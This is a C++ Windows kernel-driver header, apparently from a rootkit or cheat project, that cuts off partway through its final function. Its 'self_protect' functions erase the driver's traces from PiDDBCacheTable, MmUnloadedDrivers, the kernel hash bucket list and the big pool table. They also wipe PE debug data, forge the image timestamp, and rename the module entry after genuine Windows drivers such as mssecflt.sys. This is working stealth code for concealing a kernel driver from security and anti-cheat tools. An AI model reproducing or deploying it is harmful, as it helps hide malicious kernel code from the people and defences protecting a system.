#pragma once
#include <imports/Defs.h>
#include <core/Integrity.h>


namespace self_protect {

    inline volatile UINT32 g_own_baseline_crc = 0;
    inline volatile PVOID  g_own_code_base = nullptr;
    inline volatile ULONG  g_own_code_size = 0;
    inline volatile LONG   g_initialized = 0;

    inline volatile ULONG  g_nt_build_number = 0;
    inline volatile LONG   g_version_resolved = 0;


    __forceinline ULONG get_nt_build_number() {
        LONG state = _InterlockedCompareExchange(&g_version_resolved, 0, 0);
        if (state == 2)
            return g_nt_build_number;

        LONG prev = _InterlockedCompareExchange(&g_version_resolved, 1, 0);
        if (prev == 2) return g_nt_build_number;
        if (prev == 1) {
            while (_InterlockedCompareExchange(&g_version_resolved, 2, 2) != 2)
                YieldProcessor();
            return g_nt_build_number;
        }

        RTL_OSVERSIONINFOW ver = { sizeof(RTL_OSVERSIONINFOW) };
        if (_RtlGetVersion && NT_SUCCESS(_RtlGetVersion(&ver)))
            g_nt_build_number = ver.dwBuildNumber;
        else
            g_nt_build_number = 19045;

        KeMemoryBarrier();
        _InterlockedExchange(&g_version_resolved, 2);
        return g_nt_build_number;
    }

    __forceinline bool is_win11_24h2_or_newer() {
        return get_nt_build_number() >= 26100;
    }


    __forceinline bool safe_write_memory(PVOID dest, PVOID src, SIZE_T size) {
        if (!dest || size == 0 || !_MmIsAddressValid(dest))
            return false;

        if (!_IoAllocateMdl || !_IoFreeMdl || !_MmProbeAndLockPages ||
            !_MmUnlockPages || !_MmMapLockedPagesSpecifyCache || !_MmUnmapLockedPages)
            return false;

        PMDL mdl = _IoAllocateMdl(dest, (ULONG)size, FALSE, FALSE, nullptr);
        if (!mdl)
            return false;

        __try {
            _MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            _IoFreeMdl(mdl);
            return false;
        }

        PVOID mapped = nullptr;
        __try {
            mapped = _MmMapLockedPagesSpecifyCache(
                mdl, KernelMode, MmCached, nullptr, FALSE, NormalPagePriority);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            _MmUnlockPages(mdl);
            _IoFreeMdl(mdl);
            return false;
        }

        if (!mapped) {
            _MmUnlockPages(mdl);
            _IoFreeMdl(mdl);
            return false;
        }

        __try {
            if (src) {
                RtlCopyMemory(mapped, src, size);
            } else {
                RtlZeroMemory(mapped, size);
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            _MmUnmapLockedPages(mapped, mdl);
            _MmUnlockPages(mdl);
            _IoFreeMdl(mdl);
            return false;
        }

        _MmUnmapLockedPages(mapped, mdl);
        _MmUnlockPages(mdl);
        _IoFreeMdl(mdl);
        return true;
    }


    __forceinline PVOID find_pattern_safe(PVOID start, SIZE_T size,
                                          const UCHAR* pattern, const char* mask) {
        if (!start || !pattern || !mask || size == 0)
            return nullptr;

        SIZE_T mask_len = 0;
        while (mask[mask_len]) mask_len++;
        if (mask_len == 0 || mask_len > size)
            return nullptr;

        const UCHAR* base = static_cast<const UCHAR*>(start);
        constexpr SIZE_T page_size = 0x1000;

        for (SIZE_T i = 0; i <= size - mask_len; ) {
            ULONG_PTR current_addr = reinterpret_cast<ULONG_PTR>(base + i);
            ULONG_PTR current_page = current_addr & ~(page_size - 1);

            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(current_page))) {
                ULONG_PTR next_page = current_page + page_size;
                SIZE_T skip = next_page - current_addr;
                i += skip;
                continue;
            }

            ULONG_PTR page_end = current_page + page_size;
            SIZE_T max_this_page = page_end - reinterpret_cast<ULONG_PTR>(base);
            if (max_this_page > size) max_this_page = size;

            for (; i <= max_this_page - mask_len && i <= size - mask_len; ++i) {
                bool found = true;
                for (SIZE_T j = 0; j < mask_len; ++j) {
                    if (mask[j] == 'x' && base[i + j] != pattern[j]) {
                        found = false;
                        break;
                    }
                }
                if (found)
                    return const_cast<UCHAR*>(&base[i]);
            }
        }

        return nullptr;
    }

    __forceinline PVOID find_pattern_from(PVOID start, SIZE_T size, SIZE_T start_offset,
                                           const UCHAR* pattern, const char* mask) {
        if (!start || start_offset >= size)
            return nullptr;
        return find_pattern_safe(static_cast<UCHAR*>(start) + start_offset,
                                 size - start_offset, pattern, mask);
    }

    __forceinline ULONG get_executable_sections(PVOID module_base, PVOID* bases,
                                                  SIZE_T* sizes, ULONG max_sections) {
        if (!module_base || !bases || !sizes || max_sections == 0)
            return 0;

        PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(module_base);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

        PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
            static_cast<UCHAR*>(module_base) + dos->e_lfanew);
        if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE) return 0;

        ULONG count = 0;
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections && count < max_sections; i++) {
            if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && sec[i].Misc.VirtualSize > 0) {
                bases[count] = static_cast<UCHAR*>(module_base) + sec[i].VirtualAddress;
                sizes[count] = sec[i].Misc.VirtualSize;
                count++;
            }
        }
        return count;
    }

    __forceinline PVOID find_pattern_in_all_sections(PVOID module_base,
                                                      const UCHAR* pattern,
                                                      const char* mask) {
        PVOID bases[16];
        SIZE_T sizes[16];
        ULONG count = get_executable_sections(module_base, bases, sizes, 16);

        for (ULONG s = 0; s < count; s++) {
            PVOID result = find_pattern_safe(bases[s], sizes[s], pattern, mask);
            if (result) return result;
        }
        return nullptr;
    }

    __forceinline PVOID resolve_relative(PVOID instruction, ULONG offset_to_disp, ULONG total_size) {
        if (!instruction)
            return nullptr;

        UCHAR* ip = static_cast<UCHAR*>(instruction);
        PVOID disp_addr = ip + offset_to_disp;
        if (!_MmIsAddressValid(disp_addr))
            return nullptr;

        INT32 disp = *reinterpret_cast<INT32*>(disp_addr);
        return reinterpret_cast<PVOID>(ip + total_size + disp);
    }


    struct PIDDB_CACHE_ENTRY {
        LIST_ENTRY     List;
        UNICODE_STRING DriverName;
        ULONG          TimeDateStamp;
        NTSTATUS       LoadStatus;
        char           _pad[16];
    };

    struct PIDDB_CACHE_ENTRY_WIN11 {
        LIST_ENTRY     List;
        UNICODE_STRING DriverName;
        ULONG          TimeDateStamp;
        NTSTATUS       LoadStatus;
        ULONG64        DriverHash;
        char           _pad[8];
    };


    __forceinline bool validate_avl_table(PVOID p_table, PVOID text_base, SIZE_T text_size) {
        if (!p_table || !_MmIsAddressValid(p_table))
            return false;

        __try {
            ULONG64 nt_text_start = reinterpret_cast<ULONG64>(text_base);
            ULONG64 nt_text_end = nt_text_start + text_size;

            ULONG64 comp_addr = *reinterpret_cast<ULONG64*>(static_cast<UCHAR*>(p_table) + 0x48);
            if (comp_addr < 0xFFFF800000000000ULL) return false;
            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(comp_addr))) return false;
            if (comp_addr < nt_text_start || comp_addr >= nt_text_end) return false;

            ULONG64 alloc_addr = *reinterpret_cast<ULONG64*>(static_cast<UCHAR*>(p_table) + 0x50);
            if (alloc_addr < 0xFFFF800000000000ULL) return false;
            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(alloc_addr))) return false;

            ULONG64 free_addr = *reinterpret_cast<ULONG64*>(static_cast<UCHAR*>(p_table) + 0x58);
            if (free_addr < 0xFFFF800000000000ULL) return false;
            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(free_addr))) return false;

            ULONG num_elements = *reinterpret_cast<ULONG*>(static_cast<UCHAR*>(p_table) + 0x2C);
            if (num_elements == 0 || num_elements > 100000) return false;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return true;
    }


    __forceinline bool clean_piddb_cache(PVOID nt_base, PLDR_DATA_TABLE_ENTRY ldr_entry) {
        if (!nt_base || !ldr_entry || !ldr_entry->DllBase)
            return false;

        if (!_ExAcquireResourceExclusiveLite || !_ExReleaseResourceLite ||
            !_KeEnterCriticalRegion || !_KeLeaveCriticalRegion ||
            !_RtlLookupElementGenericTableAvl || !_RtlDeleteElementGenericTableAvl) {
            return false;
        }

        PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(ldr_entry->DllBase);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
            return false;

        PIMAGE_NT_HEADERS64 drv_nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
            static_cast<UCHAR*>(ldr_entry->DllBase) + dos->e_lfanew);
        if (!_MmIsAddressValid(drv_nt) || drv_nt->Signature != IMAGE_NT_SIGNATURE)
            return false;

        ULONG time_date_stamp = drv_nt->FileHeader.TimeDateStamp;

        PVOID sec_bases[16];
        SIZE_T sec_sizes[16];
        ULONG sec_count = get_executable_sections(nt_base, sec_bases, sec_sizes, 16);
        if (sec_count == 0)
            return false;

        static const UCHAR pat_a[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x00, 0x00, 0x00, 0x00,
            0x3D, 0x34, 0x00, 0x00, 0xC0
        };
        static const UCHAR pat_b[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x00, 0x00, 0x00, 0x00,
            0x3D, 0x22, 0x00, 0x00, 0xC0
        };
        static const UCHAR pat_c[] = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };
        static const UCHAR pat_d[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x85, 0xC0
        };
        static const UCHAR pat_e[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0x45, 0x33, 0xC0
        };
        static const UCHAR pat_f[] = {
            0x48, 0x8B, 0x55, 0x00, 0x48, 0x8D, 0x0D
        };

        struct pat_desc_t {
            const UCHAR* bytes;
            const char* mask;
            int lea_off;
        };

        pat_desc_t pats[] = {
            { pat_a, "xxx????x????xxxxx", 0 },
            { pat_b, "xxx????x????xxxxx", 0 },
            { pat_d, "xxx????x????xxx",   0 },
            { pat_c, "xxxxxx",            3 },
            { pat_e, "xxx????xxx",        0 },
            { pat_f, "xxx?xxx",           4 },
        };
        constexpr int NUM_PATS = 6;

        PVOID p_table = nullptr;
        PVOID lea_insn = nullptr;

        for (int p = 0; p < NUM_PATS && !p_table; p++) {
            for (ULONG sec = 0; sec < sec_count && !p_table; sec++) {
                SIZE_T search_off = 0;

                for (;;) {
                    PVOID found = find_pattern_from(sec_bases[sec], sec_sizes[sec],
                                                     search_off, pats[p].bytes, pats[p].mask);
                    if (!found)
                        break;

                    PVOID lea = static_cast<UCHAR*>(found) + pats[p].lea_off;
                    PVOID candidate_table = resolve_relative(lea, 3, 7);

                    if (candidate_table && _MmIsAddressValid(candidate_table) &&
                        validate_avl_table(candidate_table, sec_bases[0], sec_sizes[0])) {
                        p_table = candidate_table;
                        lea_insn = lea;
                        break;
                    }

                    SIZE_T consumed = static_cast<SIZE_T>(
                        static_cast<UCHAR*>(found) - static_cast<UCHAR*>(sec_bases[sec])) + 1;
                    if (consumed >= sec_sizes[sec])
                        break;
                    search_off = consumed;
                }
            }
        }

        if (!p_table) {
            return false;
        }

        PVOID p_lock = nullptr;

        for (int off = 0x10; off < 0xC0; off++) {
            UCHAR* scan = static_cast<UCHAR*>(lea_insn) - off;
            if (!_MmIsAddressValid(scan))
                break;

            __try {
                if (scan[0] == 0x48 && scan[1] == 0x8D &&
                    (scan[2] == 0x0D || scan[2] == 0x15)) {
                    PVOID cand = resolve_relative(scan, 3, 7);
                    if (cand && _MmIsAddressValid(cand) && cand != p_table) {
                        p_lock = cand;
                        break;
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                continue;
            }
        }

        if (!p_lock) {
            for (int off = 7; off < 0xC0; off++) {
                UCHAR* scan = static_cast<UCHAR*>(lea_insn) + off;
                if (!_MmIsAddressValid(scan))
                    break;

                __try {
                    if (scan[0] == 0x48 && scan[1] == 0x8D &&
                        (scan[2] == 0x0D || scan[2] == 0x15)) {
                        PVOID cand = resolve_relative(scan, 3, 7);
                        if (cand && _MmIsAddressValid(cand) && cand != p_table) {
                            p_lock = cand;
                            break;
                        }
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    continue;
                }
            }
        }

        if (p_lock) {
            _KeEnterCriticalRegion();
            _ExAcquireResourceExclusiveLite(static_cast<PERESOURCE>(p_lock), TRUE);
        }

        bool cleaned = false;

        __try {
            if (is_win11_24h2_or_newer()) {
                PIDDB_CACHE_ENTRY_WIN11 lookup = {};
                lookup.DriverName = ldr_entry->BaseDllName;
                lookup.TimeDateStamp = time_date_stamp;
                lookup.LoadStatus = STATUS_SUCCESS;
                lookup.DriverHash = 0;

                auto entry = static_cast<PIDDB_CACHE_ENTRY_WIN11*>(
                    _RtlLookupElementGenericTableAvl(
                        static_cast<PRTL_AVL_TABLE>(p_table), &lookup));

                if (entry && _MmIsAddressValid(entry) &&
                    _MmIsAddressValid(&entry->List) &&
                    entry->List.Flink && _MmIsAddressValid(entry->List.Flink) &&
                    entry->List.Blink && _MmIsAddressValid(entry->List.Blink)) {
                    RemoveEntryList(&entry->List);
                    _RtlDeleteElementGenericTableAvl(
                        static_cast<PRTL_AVL_TABLE>(p_table), &lookup);
                    cleaned = true;
                }
            } else {
                PIDDB_CACHE_ENTRY lookup = {};
                lookup.DriverName = ldr_entry->BaseDllName;
                lookup.TimeDateStamp = time_date_stamp;

                auto entry = static_cast<PIDDB_CACHE_ENTRY*>(
                    _RtlLookupElementGenericTableAvl(
                        static_cast<PRTL_AVL_TABLE>(p_table), &lookup));

                if (entry && _MmIsAddressValid(entry) &&
                    _MmIsAddressValid(&entry->List) &&
                    entry->List.Flink && _MmIsAddressValid(entry->List.Flink) &&
                    entry->List.Blink && _MmIsAddressValid(entry->List.Blink)) {
                    RemoveEntryList(&entry->List);
                    _RtlDeleteElementGenericTableAvl(
                        static_cast<PRTL_AVL_TABLE>(p_table), &lookup);
                    cleaned = true;
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            cleaned = false;
        }

        if (p_lock) {
            _ExReleaseResourceLite(static_cast<PERESOURCE>(p_lock));
            _KeLeaveCriticalRegion();
        }

        return cleaned;
    }


    struct MM_UNLOADED_DRIVER {
        UNICODE_STRING Name;
        PVOID ModuleStart;
        PVOID ModuleEnd;
        LARGE_INTEGER UnloadTime;
    };

    inline PVOID g_mm_unloaded_drivers_lock = nullptr;

    __forceinline bool clean_mm_unloaded_drivers(PVOID nt_base) {
        if (!nt_base || !_MmIsAddressValid(nt_base))
            return false;

        static const UCHAR pat1[] = {
            0x4C, 0x8B, 0x15, 0x00, 0x00, 0x00, 0x00,
            0x4C, 0x8B, 0xC9
        };
        static const UCHAR pat2[] = {
            0x4C, 0x8B, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x4C, 0x8B, 0xC9, 0x4D, 0x85, 0x00, 0x74
        };
        static const UCHAR pat3[] = {
            0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x8B, 0xF9
        };
        static const UCHAR pat4[] = {
            0x4C, 0x8B, 0x2D, 0x00, 0x00, 0x00, 0x00,
            0x4D, 0x85, 0xED
        };

        PVOID found = find_pattern_in_all_sections(nt_base, pat1, "xxx????xxx");
        if (!found)
            found = find_pattern_in_all_sections(nt_base, pat2, "xx?????xxxxx?x");
        if (!found)
            found = find_pattern_in_all_sections(nt_base, pat3, "xxx????xxx");
        if (!found)
            found = find_pattern_in_all_sections(nt_base, pat4, "xxx????xxx");
        if (!found)
            return false;

        PVOID p_mm_unloaded = resolve_relative(found, 3, 7);
        if (!p_mm_unloaded || !_MmIsAddressValid(p_mm_unloaded))
            return false;

        MM_UNLOADED_DRIVER* arr = *reinterpret_cast<MM_UNLOADED_DRIVER**>(p_mm_unloaded);
        if (!arr || !_MmIsAddressValid(arr))
            return false;

        if (!g_mm_unloaded_drivers_lock) {
            for (int off = 0x10; off < 0x100; off++) {
                UCHAR* scan = static_cast<UCHAR*>(found) - off;
                if (!_MmIsAddressValid(scan))
                    break;

                if (scan[0] == 0x48 && scan[1] == 0x8D && scan[2] == 0x0D) {
                    PVOID cand = resolve_relative(scan, 3, 7);
                    if (cand && _MmIsAddressValid(cand) && cand != p_mm_unloaded) {
                        g_mm_unloaded_drivers_lock = cand;
                        break;
                    }
                }
            }
        }

        bool lock_held = false;
        if (g_mm_unloaded_drivers_lock && _KeEnterCriticalRegion && _ExAcquireResourceExclusiveLite) {
            _KeEnterCriticalRegion();
            if (_ExAcquireResourceExclusiveLite(
                    static_cast<PERESOURCE>(g_mm_unloaded_drivers_lock), TRUE)) {
                lock_held = true;
            }
        }

        bool modified = false;
        constexpr ULONG MI_MAX_UNLOADED = 50;

        for (ULONG i = 0; i < MI_MAX_UNLOADED; i++) {
            MM_UNLOADED_DRIVER* e = &arr[i];
            if (!_MmIsAddressValid(e))
                break;

            if (e->Name.Buffer && e->Name.Length > 0 && _MmIsAddressValid(e->Name.Buffer)) {
                safe_write_memory(e->Name.Buffer, nullptr, e->Name.MaximumLength);
                MM_UNLOADED_DRIVER zero_entry = {};
                safe_write_memory(e, &zero_entry, sizeof(MM_UNLOADED_DRIVER));
                modified = true;
            }
        }

        if (lock_held && g_mm_unloaded_drivers_lock && _ExReleaseResourceLite && _KeLeaveCriticalRegion) {
            _ExReleaseResourceLite(static_cast<PERESOURCE>(g_mm_unloaded_drivers_lock));
            _KeLeaveCriticalRegion();
        }

        return modified;
    }


    __forceinline USHORT safe_wcslen(const wchar_t* s) {
        if (!s) return 0;
        USHORT len = 0;
        while (s[len] && len < 260) len++;
        return len;
    }

    __forceinline wchar_t locase_w(wchar_t c) {
        return (c >= L'A' && c <= L'Z') ? (c + (L'a' - L'A')) : c;
    }

    __forceinline bool clean_kernel_hash_buckets(PVOID nt_base, PUNICODE_STRING driver_name) {
        if (!driver_name || !driver_name->Buffer || driver_name->Length == 0)
            return false;

        static const UCHAR pat1[] = {
            0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00,
            0xEB, 0x00, 0xF7, 0x43
        };
        static const UCHAR pat2[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x8B, 0x5C, 0x24, 0x00, 0x48, 0x83, 0xC4
        };
        static const UCHAR pat3[] = {
            0x48, 0x8B, 0x3D, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x85, 0xFF
        };
        static const UCHAR pat4[] = {
            0x4C, 0x8B, 0x3D, 0x00, 0x00, 0x00, 0x00,
            0x4D, 0x85, 0xFF
        };

        PVOID found = find_pattern_in_all_sections(nt_base, pat1, "xxx????x?xx");
        bool is_mov = true;

        if (!found) {
            found = find_pattern_in_all_sections(nt_base, pat2, "xxx????x????xxxx?xxx");
            is_mov = false;
        }
        if (!found) {
            found = find_pattern_in_all_sections(nt_base, pat3, "xxx????xxx");
            is_mov = true;
        }
        if (!found) {
            found = find_pattern_in_all_sections(nt_base, pat4, "xxx????xxx");
            is_mov = true;
        }
        if (!found)
            return false;

        PVOID resolved = resolve_relative(found, 3, 7);
        if (!resolved || !_MmIsAddressValid(resolved))
            return false;

        PLIST_ENTRY list_head = nullptr;
        if (is_mov) {
            PVOID* pp = static_cast<PVOID*>(resolved);
            if (_MmIsAddressValid(pp) && *pp && _MmIsAddressValid(*pp))
                list_head = static_cast<PLIST_ENTRY>(*pp);
        } else {
            list_head = static_cast<PLIST_ENTRY>(resolved);
        }

        if (!list_head || !_MmIsAddressValid(list_head) ||
            !list_head->Flink || !_MmIsAddressValid(list_head->Flink))
            return false;

        bool cleaned = false;
        PLIST_ENTRY cur = list_head->Flink;
        ULONG safety = 512;

        while (cur != list_head && safety-- > 0) {
            if (!_MmIsAddressValid(cur))
                break;

            PLIST_ENTRY next = cur->Flink;

            PUNICODE_STRING entry_name = reinterpret_cast<PUNICODE_STRING>(
                reinterpret_cast<UCHAR*>(cur) + 0x10);

            if (_MmIsAddressValid(entry_name) &&
                entry_name->Length > 0 && entry_name->Length < 512 &&
                entry_name->Buffer && _MmIsAddressValid(entry_name->Buffer) &&
                entry_name->Length == driver_name->Length) {

                bool match = true;
                USHORT chars = driver_name->Length / sizeof(WCHAR);
                for (USHORT i = 0; i < chars; i++) {
                    if (locase_w(entry_name->Buffer[i]) != locase_w(driver_name->Buffer[i])) {
                        match = false;
                        break;
                    }
                }

                if (match) {
                    RemoveEntryList(cur);
                    cleaned = true;
                }
            }

            cur = next;
        }

        return cleaned;
    }


    struct POOL_TRACKER_BIG_PAGES {
        volatile ULONGLONG Va;
        ULONG Key;
        ULONG Pattern : 8;
        ULONG PoolType : 12;
        ULONG SlushSize : 12;
        ULONGLONG NumberOfBytes;
    };

    inline POOL_TRACKER_BIG_PAGES** g_pool_big_page_table = nullptr;
    inline SIZE_T* g_pool_big_page_table_size = nullptr;
    inline volatile LONG g_big_pool_resolved = 0;

    __forceinline bool resolve_big_pool_table(PVOID nt_base) {
        LONG state = _InterlockedCompareExchange(&g_big_pool_resolved, 0, 0);
        if (state == 2) return (g_pool_big_page_table != nullptr);

        LONG prev = _InterlockedCompareExchange(&g_big_pool_resolved, 1, 0);
        if (prev == 2) return (g_pool_big_page_table != nullptr);
        if (prev == 1) {
            while (_InterlockedCompareExchange(&g_big_pool_resolved, 2, 2) != 2)
                YieldProcessor();
            return (g_pool_big_page_table != nullptr);
        }

        static const UCHAR pat[] = {
            0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x85, 0xC0
        };

        PVOID found = find_pattern_in_all_sections(nt_base, pat, "xxx????xxx");
        if (!found) {
            static const UCHAR pat_alt[] = {
                0x4C, 0x8B, 0x25, 0x00, 0x00, 0x00, 0x00,
                0x4D, 0x85, 0xE4
            };
            found = find_pattern_in_all_sections(nt_base, pat_alt, "xxx????xxx");
        }

        if (found) {
            PVOID resolved = resolve_relative(found, 3, 7);
            if (resolved && _MmIsAddressValid(resolved))
                g_pool_big_page_table = reinterpret_cast<POOL_TRACKER_BIG_PAGES**>(resolved);
        }

        static const UCHAR pat_size[] = { 0x44, 0x8B, 0x35, 0x00, 0x00, 0x00, 0x00 };
        found = find_pattern_in_all_sections(nt_base, pat_size, "xxx????");
        if (found) {
            PVOID resolved = resolve_relative(found, 3, 7);
            if (resolved && _MmIsAddressValid(resolved))
                g_pool_big_page_table_size = reinterpret_cast<SIZE_T*>(resolved);
        }

        if (!g_pool_big_page_table_size) {
            static const UCHAR pat_size_alt[] = { 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00 };
            found = find_pattern_in_all_sections(nt_base, pat_size_alt, "xx????");
            if (found) {
                PVOID resolved = resolve_relative(found, 2, 6);
                if (resolved && _MmIsAddressValid(resolved))
                    g_pool_big_page_table_size = reinterpret_cast<SIZE_T*>(resolved);
            }
        }

        KeMemoryBarrier();
        _InterlockedExchange(&g_big_pool_resolved, 2);
        return (g_pool_big_page_table != nullptr);
    }

    __forceinline bool clean_big_pool_table(PVOID nt_base, PVOID driver_base, SIZE_T driver_size) {
        if (!nt_base || !driver_base || driver_size == 0)
            return false;

        if (!resolve_big_pool_table(nt_base))
            return false;

        if (!g_pool_big_page_table || !_MmIsAddressValid(g_pool_big_page_table))
            return false;

        POOL_TRACKER_BIG_PAGES* table = *g_pool_big_page_table;
        if (!table || !_MmIsAddressValid(table))
            return false;

        SIZE_T table_size = 0;
        if (g_pool_big_page_table_size && _MmIsAddressValid(g_pool_big_page_table_size))
            table_size = *g_pool_big_page_table_size;

        if (table_size == 0 || table_size > 0x100000)
            table_size = 0x10000;

        ULONGLONG drv_start = reinterpret_cast<ULONGLONG>(driver_base);
        ULONGLONG drv_end = drv_start + driver_size;
        bool cleaned = false;

        for (SIZE_T i = 0; i < table_size; i++) {
            __try {
                POOL_TRACKER_BIG_PAGES* entry = &table[i];
                if (!_MmIsAddressValid(entry))
                    continue;

                volatile ULONGLONG va = entry->Va;
                if (va >= drv_start && va < drv_end) {
                    POOL_TRACKER_BIG_PAGES zero_entry = {};
                    zero_entry.Va = 1;
                    safe_write_memory(entry, &zero_entry, sizeof(zero_entry));
                    cleaned = true;
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                continue;
            }
        }

        return cleaned;
    }


    static const wchar_t* g_disguise_candidates[] = {
        L"mssecflt.sys",
        L"bam.sys",
        L"ahcache.sys",
        L"mmcss.sys",
        L"BasicRender.sys",
        L"CompositeBus.sys",
        L"kdnic.sys",
        L"umbus.sys",
        L"WmiLib.sys",
        L"hwpolicy.sys",
        L"mssmbios.sys",
        L"intelpep.sys"
    };

    constexpr ULONG DISGUISE_CANDIDATE_COUNT = sizeof(g_disguise_candidates) / sizeof(g_disguise_candidates[0]);

    __forceinline void disguise_module_entry(PDRIVER_OBJECT driver_object) {
        if (!driver_object || !_MmIsAddressValid(driver_object))
            return;

        if (!driver_object->DriverSection || !_MmIsAddressValid(driver_object->DriverSection))
            return;

        PLDR_DATA_TABLE_ENTRY ldr = static_cast<PLDR_DATA_TABLE_ENTRY>(driver_object->DriverSection);

        if (!ldr->BaseDllName.Buffer || !_MmIsAddressValid(ldr->BaseDllName.Buffer))
            return;

        ULONG index = (ULONG)((__rdtsc() >> 8) % DISGUISE_CANDIDATE_COUNT);
        const wchar_t* new_name = g_disguise_candidates[index];

        USHORT new_len = 0;
        while (new_name[new_len]) new_len++;
        USHORT new_byte_len = new_len * sizeof(wchar_t);

        if (new_byte_len > ldr->BaseDllName.MaximumLength)
            return;

        __try {
            RtlCopyMemory(ldr->BaseDllName.Buffer, new_name, new_byte_len);
            ldr->BaseDllName.Length = new_byte_len;

            if (ldr->FullDllName.Buffer && _MmIsAddressValid(ldr->FullDllName.Buffer)) {
                const wchar_t prefix[] = L"\\SystemRoot\\System32\\drivers\\";
                USHORT prefix_len = sizeof(prefix) - sizeof(wchar_t);
                USHORT total_len = prefix_len + new_byte_len;

                if (total_len <= ldr->FullDllName.MaximumLength) {
                    RtlCopyMemory(ldr->FullDllName.Buffer, prefix, prefix_len);
                    RtlCopyMemory(
                        reinterpret_cast<UCHAR*>(ldr->FullDllName.Buffer) + prefix_len,
                        new_name, new_byte_len);
                    ldr->FullDllName.Length = total_len;
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return;
        }
    }


    __forceinline void scrub_pe_metadata(PDRIVER_OBJECT driver_object) {
        if (!driver_object || !_MmIsAddressValid(driver_object))
            return;

        if (!driver_object->DriverSection || !_MmIsAddressValid(driver_object->DriverSection))
            return;

        PLDR_DATA_TABLE_ENTRY ldr = static_cast<PLDR_DATA_TABLE_ENTRY>(driver_object->DriverSection);
        PVOID base = ldr->DllBase;

        if (!base || !_MmIsAddressValid(base))
            return;

        __try {
            PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(base);
            if (dos->e_magic != IMAGE_DOS_SIGNATURE)
                return;

            PIMAGE_NT_HEADERS64 nt_hdr = reinterpret_cast<PIMAGE_NT_HEADERS64>(
                static_cast<UCHAR*>(base) + dos->e_lfanew);
            if (!_MmIsAddressValid(nt_hdr) || nt_hdr->Signature != IMAGE_NT_SIGNATURE)
                return;

            ULONG debug_rva = nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
            ULONG debug_size = nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size;

            if (debug_rva && debug_size) {
                PVOID debug_dir = static_cast<UCHAR*>(base) + debug_rva;
                if (_MmIsAddressValid(debug_dir) && debug_size < 0x1000) {
                    safe_write_memory(debug_dir, nullptr, debug_size);
                }

                UCHAR zero_buf[8] = { 0 };
                safe_write_memory(
                    &nt_hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG],
                    zero_buf, sizeof(IMAGE_DATA_DIRECTORY));
            }

            UINT64 tsc_seed = __rdtsc();
            tsc_seed ^= tsc_seed >> 17;
            tsc_seed *= 0x2545F4914F6CDD1DULL;
            static const ULONG plausible_stamps[] = {
                0x5D6EF3A1, 0x5E98B2C4, 0x60A1F123, 0x61C7D834,
                0x62F4A789, 0x63B12345, 0x64DEF678, 0x5F123ABC
            };
            ULONG new_stamp = plausible_stamps[tsc_seed & 0x7];
            safe_write_memory(&nt_hdr->FileHeader.TimeDateStamp, &new_stamp, sizeof(ULONG));

        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return;
        }
    }


    __forceinline void apply_stealth(PDRIVER_OBJECT driver_object) {
        SN_LOG("self_protect::apply_stealth: driver_object=%p", driver_object);
        if (!driver_object)
            return;

        PVOID nt_base = reinterpret_cast<PVOID>(get_nt_base());
        if (!nt_base) {
            SN_LOG("self_protect::apply_stealth: no nt_base");
            return;
        }

        PLDR_DATA_TABLE_ENTRY ldr = nullptr;
        if (driver_object->DriverSection && _MmIsAddressValid(driver_object->DriverSection))
            ldr = static_cast<PLDR_DATA_TABLE_ENTRY>(driver_object->DriverSection);

        SN_LOG("self_protect::apply_stealth: ldr=%p", ldr);

        if (ldr && ldr->DllBase)
            clean_piddb_cache(nt_base, ldr);

        if (ldr && ldr->BaseDllName.Buffer)
            clean_kernel_hash_buckets(nt_base, &ldr->BaseDllName);

        clean_mm_unloaded_drivers(nt_base);

        if (ldr && ldr->DllBase && ldr->SizeOfImage)
            clean_big_pool_table(nt_base, ldr->DllBase, ldr->SizeOfImage);

        scrub_pe_metadata(driver_object);

        disguise_module_entry(driver_object);
